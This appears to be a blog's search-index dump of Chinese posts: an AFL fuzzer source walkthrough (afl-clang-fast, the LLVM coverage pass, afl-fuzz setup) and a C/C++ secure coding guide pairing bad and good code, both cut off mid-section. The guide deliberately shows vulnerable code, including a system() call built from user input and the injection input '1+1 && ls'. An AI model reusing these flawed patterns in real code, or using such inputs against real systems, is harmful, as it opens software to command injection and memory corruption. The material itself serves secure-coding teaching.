其中主要有以下三个函数的调用： find_obj(argv[0])：查找运行时library edit_params(argc, argv)：处理传入的编译参数，将确定好的参数放入 cc_params[] 数组 execvp(cc_params[0], (cahr**)cc_params)：替换进程空间，传递参数，执行要调用的clang 这里后两个函数的作用与 afl-gcc.c 中的作用基本相同，只是对参数的处理过程存在不同，不同的主要是 find_obj() 函数。 2. find_obj 函数 find_obj()函数的控制流逻辑如下： 首先，读取环境变量 AFL_PATH 的值： 如果读取成功，确认 AFL_PATH/afl-llvm-rt.o 是否可以访问；如果可以访问，设置该目录为 obj_path ，然后直接返回； 如果读取失败，检查 arg0 中是否存在 / 字符，如果存在，则判断最后一个 / 前面的路径为 AFL 的根目录；然后读取afl-llvm-rt.o文件，成功读取，设置该目录为 obj_path ，然后直接返回。 如果上面两种方式都失败，到/usr/local/lib/afl 目录下查找是否存在 afl-llvm-rt.o ，如果存在，则设置为 obj_path 并直接返回（之所以向该路径下寻找，是因为默认的AFL的MakeFile在编译时，会定义一个名为AFL_PATH的宏，该宏会指向该路径）； 如果以上全部失败，抛出异常提示找不到 afl-llvm-rt.o 文件或 afl-llvm-pass.so 文件，并要求设置 AFL_PATH 环境变量 。 函数的主要功能是在寻找AFL的路径以找到 afl-llvm-rt.o 文件，该文件即为要用到的运行时库。 3. edit_params 函数 该函数的主要作用仍然为编辑参数数组，其控制流程如下： 首先，判断执行的是否为 afl-clang-fast++ ： 如果是，设置 cc_params[0] 为环境变量 AFL_CXX；如果环境变量为空，则设置为 clang++ ； 如果不是，设置 cc_params[0] 为环境变量 AFL_CC；如果环境变量为空，则设置为 clang ； 判断是否定义了 USE_TRACE_PC 宏，如果有，添加 -fsanitize-coverage=trace-pc-guard -mllvm(only Android) -sanitizer-coverage-block-threshold=0(only Android) 选项到参数数组；如果没有，依次将 -Xclang -load -Xclang obj_path/afl-llvm-pass.so -Qunused-arguments 选项添加到参数数组；（这里涉及到llvm_mode使用的2种插桩方式：默认使用的是传统模式，使用 afl-llvm-pass.so 注入来进行插桩，这种方式较为稳定；另外一种是处于实验阶段的方式——trace-pc-guard 模式，对于该模式的详细介绍可以参考llvm相关文档——tracing-pcs-with-guards） 遍历传递给 afl-clang-fast 的参数，进行一定的检查和设置，并添加到 cc_params 数组： 如果存在 -m32 或 armv7a-linux-androideabi ，设置 bit_mode 为32； 如果存在 -m64 ，设置 bit_mode 为64； 如果存在 -x ，设置 x_set 为1； 如果存在 -fsanitize=address 或 -fsanitize=memory，设置 asan_set 为1； 如果存在 -Wl,-z,defs 或 -Wl,--no-undefined，则直接pass掉。 检查环境变量是否设置了 AFL_HARDEN： 如果有，添加 -fstack-protector-all 选项； 如果有且没有设置 FORTIFY_SOURCE ，添加 -D_FORTIFY_SOURCE=2 选项； 检查参数中是否存在 -fsanitize=memory，即 asan_set 为0： 如果没有，尝试读取环境变量 AFL_USE_ASAN，如果存在，添加 -U_FORTIFY_SOURCE -fsanitize=address； 接下来对环境变量AFL_USE_MSAN的处理方式与 AFL_USE_ASAN 类似，添加的选项为 -U_FORTIFY_SOURCE -fsanitize=memory； 检查是否定义了 USE_TRACE_PC 宏，如果存在定义，检查是否存在环境变量 AFL_INST_RATIO，如果存在，抛出异常AFL_INST_RATIO 无法在trace-pc时使用； 检查环境变量 AFL_NO_BUILTIN ，如果没有设置，添加 -g -O3 -funroll-loops； 检查环境变量 AFL_NO_BUILTIN，如果进行了设置，添加 -fno-builtin-strcmp -fno-builtin-strncmp -fno-builtin-strcasecmp -fno-builtin-strcasecmp -fno-builtin-memcmp； 添加参数 -D__AFL_HAVE_MANUAL_CONTROL=1 -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1； 定义了两个宏 __AFL_LOOP(), __AFL_INIT()； 检查是否设置了 x_set， 如果有添加 -x none； 检查是否设置了宏 __ANDORID__ ，如果没有，判断 bit_mode 的值： 如果为0，即没有-m32和-m64，添加 obj_path/afl-llvm-rt.o ； 如果为32，添加 obj_path/afl-llvm-rt-32.o ； 如果为64，添加 obj_path/afl-llvm-rt-64.o 。 2. afl-llvm-pass.so.cc afl-llvm-pass.so.cc 文件实现了 LLVM-mode 下的一个插桩 LLVM Pass。 本文不过多关心如何实现一个LLVM Pass，重点分析该pass的实现逻辑。 该文件只有一个Transform pass： AFLCoverage，继承自 ModulePass，实现了一个 runOnModule 函数，这也是我们需要重点分析的函数。 namespace { class AFLCoverage : public ModulePass { public: static char ID; AFLCoverage() : ModulePass(ID) { } bool runOnModule(Module \u0026M) override; // StringRef getPassName() const override { // return \"American Fuzzy Lop Instrumentation\"; // } }; } 1. pass注册 对pass进行注册的部分源码如下： static void registerAFLPass(const PassManagerBuilder \u0026, legacy::PassManagerBase \u0026PM) { PM.add(new AFLCoverage()); } static RegisterStandardPasses RegisterAFLPass( PassManagerBuilder::EP_ModuleOptimizerEarly, registerAFLPass); static RegisterStandardPasses RegisterAFLPass0( P","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:4:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"三、AFL的fuzzer —— afl-fuzz.c ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:5:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"1. 、概述 AFL中最重要的部分便是fuzzer的实现部分——afl_fuzz.c ，其主要作用是通过不断变异测试用例来影响程序的执行路径。该文件代码量在8000行左右，处于篇幅原因，我们不会对每一个函数进行源码级分析，而是按照功能划分，介绍其中的核心函数。该文件属于AFL整个项目的核心中的核心，强烈建议通读该文件。 在介绍源码的同时，会穿插AFL的整体运行过程和设计思路，辅助理解源码的设计思路。 在功能上，可以总体上分为3部分： 初始配置：进行fuzz环境配置相关工作 fuzz执行：fuzz的主循环过程 变异策略：测试用例的变异过程和方式 我们将按照以上3个功能对其中的关键函数和流程进行分析。 ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:5:1","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"2、核心源码分析 1. 初始配置 1.1 第一个while循环 while ((opt = getopt(argc, argv, \"+i:o:f:m:b:t:T:dnCB:S:M:x:QV\")) \u003e 0) ... ... 该循环主要通过 getopt 获取各种环境配置、选项参数等。 1.2 setup_signal_handlers 函数 调用 sigaction ，注册信号处理函数，设置信号句柄。具体的信号内容如下： 信号 作用 SIGHUP/SIGINT/SIGTERM 处理各种“stop”情况 SIGALRM 处理超时的情况 SIGWINCH 处理窗口大小 SIGUSER1 用户自定义信号，这里定义为skip request SIGSTP/SIGPIPE 不是很重要的一些信号，可以不用关心 1.3 check_asan_opts 函数 读取环境变量 ASAN_OPTIONS 和 MSAN_OPTIONS，做一些必要性检查。 1.4 fix_up_sync 函数 如果通过 -M或者-S指定了 sync_id，则更新 out_dir 和 sync_dir 的值：设置 sync_dir 的值为 out_dir，设置 out_dir 的值为out_dir/sync_id。 1.5 save_cmdline 函数 copy当前命令行参数，保存。 1.6 check_if_tty 函数 检查是否在tty终端上面运行：读取环境变量 AFL_NO_UI ，如果存在，设置 not_on_tty 为1，并返回；通过 ioctl 读取window size，如果报错为 ENOTTY，表示当前不在一个tty终端运行，设置 not_on_tty。 1.7 几个CPU检查相关的函数 static void get_core_count(void)get_core_count() ：获取核心数量 check_crash_handling()：确保核心转储不会进入程序 check_cpu_governor()：检查CPU管理者 1.8 setup_shm 函数 该函数用于设置共享内存和 virgin_bits，属于比较重要的函数，这里我们结合源码来解析一下： /* Configure shared memory and virgin_bits. This is called at startup. */ EXP_ST void setup_shm(void) { u8* shm_str; if (!in_bitmap) memset(virgin_bits, 255, MAP_SIZE); // 如果 in_bitmap 为空，调用 memset 初始化数组 virgin_bits[MAP_SIZE] 的每个元素的值为 ‘255’。 memset(virgin_tmout, 255, MAP_SIZE); // 调用 memset 初始化数组 virgin_tmout[MAP_SIZE] 的每个元素的值为 ‘255’。 memset(virgin_crash, 255, MAP_SIZE); // 调用 memset 初始化数组 virgin_crash[MAP_SIZE] 的每个元素的值为 ‘255’。 shm_id = shmget(IPC_PRIVATE, MAP_SIZE, IPC_CREAT | IPC_EXCL | 0600); // 调用 shmget 函数分配一块共享内存，并将返回的共享内存标识符保存到 shm_id if (shm_id \u003c 0) PFATAL(\"shmget() failed\"); atexit(remove_shm); // 注册 atexit handler 为 remove_shm shm_str = alloc_printf(\"%d\", shm_id); // 创建字符串 shm_str /* If somebody is asking us to fuzz instrumented binaries in dumb mode, we don't want them to detect instrumentation, since we won't be sending fork server commands. This should be replaced with better auto-detection later on, perhaps? */ if (!dumb_mode) setenv(SHM_ENV_VAR, shm_str, 1); // 如果不是dumb_mode，设置环境变量 SHM_ENV_VAR 的值为 shm_str ck_free(shm_str); trace_bits = shmat(shm_id, NULL, 0); // 设置 trace_bits 并初始化为0 if (trace_bits == (void *)-1) PFATAL(\"shmat() failed\"); } 这里通过 trace_bits 和 virgin_bits 两个 bitmap 来分别记录当前的 tuple 信息及整体 tuple 信息，其中 trace_bits 位于共享内存上，便于进行进程间通信。通过 virgin_tmout 和 virgin_crash 两个 bitmap 来记录 fuzz 过程中出现的所有目标程序超时以及崩溃的 tuple 信息。 1.9 setup_dirs_fds 函数 该函数用于准备输出文件夹和文件描述符，结合源码进行解析： EXP_ST void setup_dirs_fds(void) { u8* tmp; s32 fd; ACTF(\"Setting up output directories...\"); if (sync_id \u0026\u0026 mkdir(sync_dir, 0700) \u0026\u0026 errno != EEXIST) PFATAL(\"Unable to create '%s'\", sync_dir); /* 如果sync_id，且创建sync_dir文件夹并设置权限为0700，如果报错单errno不是 EEXIST ，抛出异常 */ if (mkdir(out_dir, 0700)) { // 创建out_dir， 权限为0700 if (errno != EEXIST) PFATAL(\"Unable to create '%s'\", out_dir); maybe_delete_out_dir(); } else { if (in_place_resume) // 创建成功 FATAL(\"Resume attempted but old output directory not found\"); out_dir_fd = open(out_dir, O_RDONLY); // 以只读模式打开，返回fd：out_dir_fd #ifndef __sun if (out_dir_fd \u003c 0 || flock(out_dir_fd, LOCK_EX | LOCK_NB)) PFATAL(\"Unable to flock() output directory.\"); #endif /* !__sun */ } /* Queue directory for any starting \u0026 discovered paths. */ tmp = alloc_printf(\"%s/queue\", out_dir); if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); // 创建 out_dir/queue 文件夹，权限为0700 ck_free(tmp); /* Top-level directory for queue metadata used for session resume and related tasks. */ tmp = alloc_printf(\"%s/queue/.state/\", out_dir); // 创建 out_dir/queue/.state 文件夹，用于保存session resume 和相关tasks的队列元数据。 if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); ck_free(tmp); /* Directory for flagging queue entries that went through deterministic fuzzing in the past. */ tmp = alloc_printf(\"%s/queue/.state/deterministic_done/\", out_dir); if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); ck_free(tmp); /* Directory with the auto-selected dictionary entries. */ tmp = alloc_printf(\"%s/queue/.state/auto_extras/\", out_dir); if (mkdir(tmp, 0700)) PFATAL(\"Unable to create '%s'\", tmp); ck_free(tmp); /* The set of paths currently deemed red","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:5:2","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"四、总结 分析完源码，可以感受到，AFL遵循的基本原则是简单有效，没有进行过多的复杂的优化，能够针对fuzz领域的痛点，对症下药，拒绝花里胡哨，给出切实可行的解决方案，在漏洞挖掘领域的意义的确非同凡响。后期的很多先进的fuzz工具基本沿用了AFL的思路，甚至目前为止已基本围绕AFL建立了“生态圈”，涉及到多个平台、多种漏洞挖掘对象，对于安全研究员来说实属利器，值得从事fuzz相关工作的研究员下足功夫去体会AFL的精髓所在。 考虑到篇幅限制，我们没有对AFL中的变异策略进行源码说明，实属遗憾。如果有机会，将新开文章详细介绍AFL的变异策略和源码分析。 ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:6:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Fuzz"],"content":"五、参考文献 http://lcamtuf.coredump.cx/afl/ https://eternalsakura13.com/2020/08/23/afl/ https://bbs.pediy.com/thread-265936.htm https://bbs.pediy.com/thread-249912.htm#msg_header_h3_3 ","date":"0001-01-01","objectID":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/:7:0","tags":["Fuzz","AFL"],"title":"AFL二三事 -- 4","uri":"/2021/01/afl%E4%BA%8C%E4%B8%89%E4%BA%8B4/"},{"categories":["Development"],"content":"通用安全编码指南 C/C++篇","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"收集于github，通用安全编码指南系列第一篇：C/C++，总结概述在C/C ++编码过程中常见的安全问题和应该采取的安全编码格式。 目录 1 通用安全指南 I. C/C++使用错误 1.1 不得直接使用无长度限制的字符拷贝函数 1.2 创建进程类的函数的安全规范 1.3 尽量减少使用 _alloca 和可变长度数组 1.4 printf系列参数必须对应 1.5 防止泄露指针（包括%p）的值 1.6 不应当把用户可修改的字符串作为printf系列函数的“format”参数 1.7 对数组delete时需要使用delete[] 1.8 注意隐式符号转换 1.9 注意八进制问题 II. 不推荐的编程习惯 2.1 switch中应有default 2.2 不应当在Debug或错误信息中提供过多内容 2.3 不应该在客户端代码中硬编码对称加密秘钥 2.4 返回栈上变量的地址 2.5 有逻辑联系的数组必须仔细检查 2.6 避免函数的声明和实现不同 2.7 检查复制粘贴的重复代码 2.8 左右一致的重复判断/永远为真或假的判断 2.9 函数每个分支都应有返回值 2.10 不得使用栈上未初始化的变量 2.11 不得直接使用刚分配的未初始化的内存（如realloc） 2.12 校验内存相关函数的返回值 2.13 不要在if里面赋值 2.14 确认if里面的按位操作 III. 多线程 3.1 变量应确保线程安全性 3.2 注意signal handler导致的条件竞争 3.3 注意Time-of-check Time-of-use条件竞争 IV. 加密解密 4.1 不得明文存储用户密码等敏感数据 4.2 内存中的用户密码等敏感数据应该安全抹除 4.3 rand() 类函数应正确初始化 4.4 在需要高强度安全加密时不应使用弱PRNG函数 4.5 自己实现的rand范围不应过小 V. 文件操作 5.1 避免路径穿越问题 5.2 避免相对路径导致的安全问题 5.3 文件权限控制 Ⅵ. 文件操作 6.1 防止各种越界写 6.2 防止任意地址写 Ⅶ. 文件操作 7.1 防止整数溢出 7.2 防止Off-By-One 7.3 避免大小端错误 7.4 检查除以零异常 7.5 防止数字类型的错误强转 7.6 比较数据大小时加上最小/最大值的校验 Ⅷ. 文件操作 8.1 检查在pointer上使用sizeof 8.2 检查直接将数组和0比较的代码 8.3 不应当向指针赋予写死的地址 8.4 检查空指针 8.5 释放完后置空指针 8.6 防止错误的类型转换 8.7 智能指针使用安全 ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:0:0","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"通用安全指南 ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:1:0","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"1 C/C++ 使用错误 1.1 【必须】不得直接使用无长度限制的字符拷贝函数 不应直接使用legacy的字符串拷贝、输入函数，如strcpy、strcat、sprintf、wcscpy、mbscpy等，这些函数的特征是：可以输出一长串字符串，而不限制长度。如果环境允许，应当使用其_s安全版本替代，或者使用n版本函数（如：snprintf，vsnprintf）。 若使用形如sscanf之类的函数时，在处理字符串输入时应当通过%10s这样的方式来严格限制字符串长度，同时确保字符串末尾有\\0。如果环境允许，应当使用_s安全版本。 但是注意，虽然MSVC 2015时默认引入结尾为0版本的snprintf（行为等同于C99定义的snprintf）。但更早期的版本中，MSVC的snprintf可能是_snprintf的宏。而_snprintf是不保证\\0结尾的（见本节后半部分）。 （MSVC） Beginning with the UCRT in Visual Studio 2015 and Windows 10, snprintf is no longer identical to _snprintf. The snprintf function behavior is now C99 standard compliant. 从Visual Studio 2015和Windows 10中的UCRT开始，snprintf不再与_snprintf相同。snprintf函数行为现在符合C99标准。 请参考：https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/snprintf-snprintf-snprintf-l-snwprintf-snwprintf-l?redirectedfrom=MSDN\u0026view=vs-2019 因此，在使用n系列拷贝函数时，要确保正确计算缓冲区长度，同时，如果你不确定是否代码在各个编译器下都能确保末尾有0时，建议可以适当增加1字节输入缓冲区，并将其置为\\0，以保证输出的字符串结尾一定有\\0。 // Good char buf[101] = {0}; snprintf(buf, sizeof(buf) - 1, \"foobar ...\", ...); 一些需要注意的函数，例如strncpy和_snprintf是不安全的。 strncpy不应当被视为strcpy的n系列函数，它只是恰巧与其他n系列函数名字很像而已。strncpy在复制时，如果复制的长度超过n，不会在结尾补\\0。 同样，MSVC _snprintf系列函数在超过或等于n时也不会以0结尾。如果后续使用非0结尾的字符串，可能泄露相邻的内容或者导致程序崩溃。 // Bad char a[4] = {0}; _snprintf(a, 4, \"%s\", \"AAAA\"); foo = strlen(a); 上述代码在MSVC中执行后， a[4] == ‘A’，因此字符串未以0结尾。a的内容是\"AAAA\"，调用strlen(a)则会越界访问。因此，正确的操作举例如下： // Good char a[4] = {0}; _snprintf(a, sizeof(a), \"%s\", \"AAAA\"); a[sizeof(a) - 1] = '\\0'; foo = strlen(a); 在 C++ 中，强烈建议用 string、vector 等更高封装层次的基础组件代替原始指针和动态数组，对提高代码的可读性和安全性都有很大的帮助。 关联漏洞: 中风险-信息泄露 低风险-拒绝服务 高风险-缓冲区溢出 1.2 【必须】创建进程类的函数的安全规范 system、WinExec、CreateProcess、ShellExecute等启动进程类的函数，需要严格检查其参数。 启动进程需要加上双引号，错误例子： // Bad WinExec(\"D:\\\\program files\\\\my folder\\\\foobar.exe\", SW_SHOW); 当存在D:\\program files\\my.exe的时候，my.exe会被启动。而foobar.exe不会启动。 // Good WinExec(\"\\\"D:\\\\program files\\\\my folder\\\\foobar.exe\\\"\", SW_SHOW); 另外，如果启动时从用户输入、环境变量读取组合命令行时，还需要注意是否可能存在命令注入。 // Bad std::string cmdline = \"calc \"; cmdline += user_input; system(cmdline.c_str()); 比如，当用户输入1+1 \u0026\u0026 ls时，执行的实际上是calc 1+1和ls 两个命令，导致命令注入。 需要检查用户输入是否含有非法数据。 // Good std::string cmdline = \"ls \"; cmdline += user_input; if(cmdline.find_first_not_of(\"1234567890.+-*/e \") == std::string::npos) system(cmdline.c_str()); else warning(...); 关联漏洞: 高风险-代码执行 高风险-权限提升 1.3 【必须】尽量减少使用 _alloca 和可变长度数组 _alloca 和可变长度数组使用的内存量在编译期间不可知。尤其是在循环中使用时，根据编译器的实现不同，可能会导致：（1）栈溢出，即拒绝服务； （2）缺少栈内存测试的编译器实现可能导致申请到非栈内存，并导致内存损坏。这在栈比较小的程序上，例如IoT设备固件上影响尤为大。对于 C++，可变长度数组也属于非标准扩展，在代码规范中禁止使用。 错误示例： // Bad for (int i = 0; i \u003c 100000; i++) { char* foo = (char *)_alloca(0x10000); ..do something with foo ..; } void Foo(int size) { char msg[size]; // 不可控的栈溢出风险！ } 正确示例： // Good // 改用动态分配的堆内存 for (int i = 0; i \u003c 100000; i++) { char * foo = (char *)malloc(0x10000); ..do something with foo ..; if (foo_is_no_longer_needed) { free(foo); foo = NULL; } } void Foo(int size) { std::string msg(size, '\\0'); // C++ char* msg = malloc(size); // C } 关联漏洞: 低风险-拒绝服务 高风险-内存破坏 1.4 【必须】printf系列参数必须对应 所有printf系列函数，如sprintf，snprintf，vprintf等必须对应控制符号和参数。 错误示例： // Bad const int buf_size = 1000; char buffer_send_to_remote_client[buf_size] = {0}; snprintf(buffer_send_to_remote_client, buf_size, \"%d: %p\", id, some_string); // %p 应为 %s buffer_send_to_remote_client[buf_size - 1] = '\\0'; send_to_remote(buffer_send_to_remote_client); 正确示例： // Good const int buf_size = 1000; char buffer_send_to_remote_client[buf_size] = {0}; snprintf(buffer_send_to_remote_client, buf_size, \"%d: %s\", id, some_string); buffer_send_to_remote_client[buf_size - 1] = '\\0'; send_to_remote(buffer_send_to_remote_client); 前者可能会让client的攻击者获取部分服务器的原始指针地址，可以用于破坏ASLR保护。 关联漏洞: 中风险-信息泄露 1.5 【必须】防止泄露指针（包括%p）的值 所有printf系列函数，要防止格式化完的字符串泄露程序布局信息。例如，如果将带有%p的字符串泄露给程序，则可能会破坏ASLR的防护效果。使得攻击者更容易攻破程序。 %p的值只应当在程序内使用，而不应当输出到外部或被外部以某种方式获取。 错误示例： // Bad // 如果这是暴露给客户的一个API： uint64_t GetUniqueObjectId(const Foo* pobject) { return (uint64_t)pobject; } 正确示例： // Good uint64_t g_object_id = 0; void Foo::Foo() { this-\u003eobject_id_ = g_object_id++; } // 如果这是暴露给客户的一个API： uint64_t GetUniqueObjectId(const Foo* objec","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:1:1","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"2 不推荐的编程习惯 2.1 【必须】switch中应有default switch中应该有default，以处理各种预期外的情况。这可以确保switch接受用户输入，或者后期在其他开发者修改函数后确保switch仍可以覆盖到所有情况，并确保逻辑正常运行。 // Bad int Foo(int bar) { switch (bar \u0026 7) { case 0: return Foobar(bar); break; case 1: return Foobar(bar * 2); break; } } 例如上述代码switch的取值可能从0～7，所以应当有default： // Good int Foo(int bar) { switch (bar \u0026 7) { case 0: return Foobar(bar); break; case 1: return Foobar(bar * 2); break; default: return -1; } } 关联漏洞: 中风险-逻辑漏洞 中风险-内存泄漏 2.2 【必须】不应当在Debug或错误信息中提供过多内容 包含过多信息的Debug消息不应当被用户获取到。Debug信息可能会泄露一些值，例如内存数据、内存地址等内容，这些内容可以帮助攻击者在初步控制程序后，更容易地攻击程序。 // Bad int Foo(int* bar) { if (bar \u0026\u0026 *bar == 5) { OutputDebugInfoToUser(\"Wrong value for bar %p = %d\\n\", bar, *bar); } } 而应该： // Good int foo(int* bar) { #ifdef DEBUG if (bar \u0026\u0026 *bar == 5) { OutputDebugInfo(\"Wrong value for bar.\\n\", bar, *bar); } #endif } 关联漏洞: 中风险-信息泄漏 2.3 【必须】不应该在客户端代码中硬编码对称加密秘钥 不应该在客户端代码中硬编码对称加密秘钥。例如：不应在客户端代码使用硬编码的 AES/ChaCha20-Poly1305/SM1 密钥，使用固定密钥的程序基本和没有加密一样。 如果业务需求是认证加密数据传输，应优先考虑直接用 HTTPS 协议。 如果是其它业务需求，可考虑由服务器端生成对称秘钥，客户端通过 HTTPS 等认证加密通信渠道从服务器拉取。 或者根据用户特定的会话信息，比如登录认证过程可以根据用户名用户密码业务上下文等信息，使用 HKDF 等算法衍生出对称秘钥。 又或者使用 RSA/ECDSA + ECDHE 等进行认证秘钥协商，生成对称秘钥。 // Bad char g_aes_key[] = {...}; void Foo() { .... AES_func(g_aes_key, input_data, output_data); } 可以考虑在线为每个用户获取不同的密钥： // Good char* g_aes_key; void Foo() { .... AES_encrypt(g_aes_key, input_data, output_data); } void Init() { g_aes_key = get_key_from_https(user_id, ...); } 关联漏洞: 中风险-信息泄露 2.4 【必须】返回栈上变量的地址 函数不可以返回栈上的变量的地址，其内容在函数返回后就会失效。 // Bad char* Foo(char* sz, int len){ char a[300] = {0}; if (len \u003e 100) { memcpy(a, sz, 100); } a[len] = '\\0'; return a; // WRONG } 而应当使用堆来传递非简单类型变量。 // Good char* Foo(char* sz, int len) { char* a = new char[300]; if (len \u003e 100) { memcpy(a, sz, 100); } a[len] = '\\0'; return a; // OK } 对于 C++ 程序来说，强烈建议返回 string、vector 等类型，会让代码更加简单和安全。 关联漏洞: 高风险-内存破坏 2.5 【必须】有逻辑联系的数组必须仔细检查 例如下列程序将字符串转换为week day，但是两个数组并不一样长，导致程序可能会越界读一个int。 // Bad int nWeekdays[] = {1, 2, 3, 4, 5, 6}; const char* sWeekdays[] = {\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"}; for (int x = 0; x \u003c ARRAY_SIZE(sWeekdays); x++) { if (strcmp(sWeekdays[x], input) == 0) return nWeekdays[x]; } 应当确保有关联的nWeekdays和sWeekdays数据统一。 // Good const int nWeekdays[] = {1, 2, 3, 4, 5, 6, 7}; const char* sWeekdays[] = {\"Mon\", \"Tue\", \"Wed\", \"Thu\", \"Fri\", \"Sat\", \"Sun\"}; assert(ARRAY_SIZE(nWeekdays) == ARRAY_SIZE(sWeekdays)); for (int x = 0; x \u003c ARRAY_SIZE(sWeekdays); x++) { if (strcmp(sWeekdays[x], input) == 0) { return nWeekdays[x]; } } 关联漏洞: 高风险-内存破坏 2.6 【必须】避免函数的声明和实现不同 在头文件、源代码、文档中列举的函数声明应当一致，不应当出现定义内容错位的情况。 错误： foo.h int CalcArea(int width, int height); foo.cc int CalcArea(int height, int width) { // Different from foo.h if (height \u003e real_height) { return 0; } return height * width; } 正确： foo.h int CalcArea(int height, int width); foo.cc int CalcArea (int height, int width) { if (height \u003e real_height) { return 0; } return height * width; } 关联漏洞: 中风险-逻辑问题 2.7 【必须】检查复制粘贴的重复代码（相同代码通常代表错误） 当开发中遇到较长的句子时，如果你选择了复制粘贴语句，请记得检查每一行代码，不要出现上下两句一模一样的情况，这通常代表代码哪里出现了错误： // Bad void Foobar(SomeStruct\u0026 foobase, SomeStruct\u0026 foo1, SomeStruct\u0026 foo2) { foo1.bar = (foo1.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); foo1.bar = (foo1.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); } 如上例，通常可能是： // Good void Foobar(SomeStruct\u0026 foobase, SomeStruct\u0026 foo1, SomeStruct\u0026 foo2) { foo1.bar = (foo1.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); foo2.bar = (foo2.bar \u0026 0xffff) | (foobase.base \u0026 0xffff0000); } 最好是把重复的代码片段提取成函数，如果函数比较短，可以考虑定义为 inline 函数，在减少冗余的同时也能确保不会影响性能。 关联漏洞: 中风险-逻辑问题 2.8 【必须】左右一致的重复判断/永远为真或假的判断（通常代表错误） 这通常是由于自动完成或例如Visual Assistant X之类的补全插件导致的问题。 // Bad if (foo1.bar == foo1.bar) { … } 可能是： // Good if (foo1.bar == foo2.bar) { … } 关联漏洞: 中风险-逻辑问题 2.9 【必须】函数每个分支都应有返回值 函数的每个分支都应该有返回值，否则如果函数走到无返回值的分支，其结果是未知的。 // Bad int Foo(int bar) { if (bar \u003e 100) { return 10; } else if (bar \u003e 10) { return 1; } } 上述例子当bar\u003c10时，其结果是未知的值。 // Good int Foo(int bar) { if (bar \u003e 100) { return 10; } else if (bar \u003e 10) { return 1; } return 0; } 开启适当级别的警告（GCC 中为 -Wreturn-type ","date":"2021-01-04","objectID":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/:1:2","tags":["Coding","C/C++"],"title":"通用安全编码指南 -- C/C++ 篇","uri":"/2021/01/%E9%80%9A%E7%94%A8%E5%AE%89%E5%85%A8%E7%BC%96%E7%A0%81%E6%8C%87%E5%8D%97--c-c/"},{"categories":["Development"],"content":"3 多线程 3.1 【必须】变量应确保线程安全性 当一个变量可能被多个线程使用时，应当使用原子操作或加锁操作。 // Bad char g_somechar; void foo_thread1() { g_somechar += 3; } void foo_thread2() { g_somechar += 1; } 对于可以使用原子操作的，应当使用一些可以确保内存安全的操作，如： // Good volatile char g_somechar; void foo_thread1() { __sync_fetch_and_add(\u0026g_somechar, 3); } void foo_thread2() { __sync_fetch_and_add(\u0026g_somechar, 1); } 对于 C 代码，C11 后推荐使用 atomic 标准库。 对于 C++代码，C++11 后，推荐使用 std::atomic。 关联漏洞: 高风险-内存破坏 中风险-逻辑问题 3.2 【必须】注意signal handler导致的条件竞争 